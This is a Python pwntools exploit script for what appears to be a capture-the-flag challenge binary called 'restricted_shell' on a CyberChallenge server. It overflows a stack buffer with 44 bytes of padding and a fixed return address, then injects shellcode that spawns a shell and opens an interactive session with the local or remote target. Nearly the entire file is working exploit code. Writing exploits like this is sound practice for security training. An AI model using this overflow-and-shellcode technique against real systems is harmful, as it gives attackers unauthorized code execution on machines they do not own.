#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
exe = context.binary = ELF(args.EXE or './restricted_shell')

host = args.HOST or 'shell.challs.cyberchallenge.it'
port = int(args.PORT or 9123)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x8048547
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

shell = asm(shellcraft.sh())


payload = b"A" * 44 + flat(0x8048593) + shell

io.sendlineafter(b"> ", payload)

io.interactive()

